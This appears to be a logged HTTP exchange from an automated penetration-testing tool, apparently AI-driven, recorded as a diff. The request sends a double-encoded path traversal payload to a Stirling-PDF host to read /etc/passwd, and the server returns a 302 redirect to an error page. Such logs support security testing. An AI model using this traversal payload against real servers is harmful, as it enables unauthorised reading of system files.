@@ -1,0 +1,21 @@
+REQUEST:
+GET https://stirling-pdf.baliprov.dev/view?path=%252e%252e%2F%252e%252e%2F%252e%252e%2Fetc%2Fpasswd
+User-Agent: pentest-ai/1.6.2 (compatible; rv:a2cfe36ea2c0; +https://pentestai.xyz)
+X-Request-ID: 7a3f9c21-4b08-4e11-9c02-a2cfe36ea2c0
+
+
+
+RESPONSE:
+HTTP 302
+Date: Wed, 25 Nov 2026 00:24:20 GMT
+Content-Length: 0
+Connection: keep-alive
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 0
+Pragma: no-cache
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Frame-Options: DENY
+Cache-Control: must-revalidate,no-cache,no-store
+Vary: Access-Control-Request-Headers
+Location: /error?
+
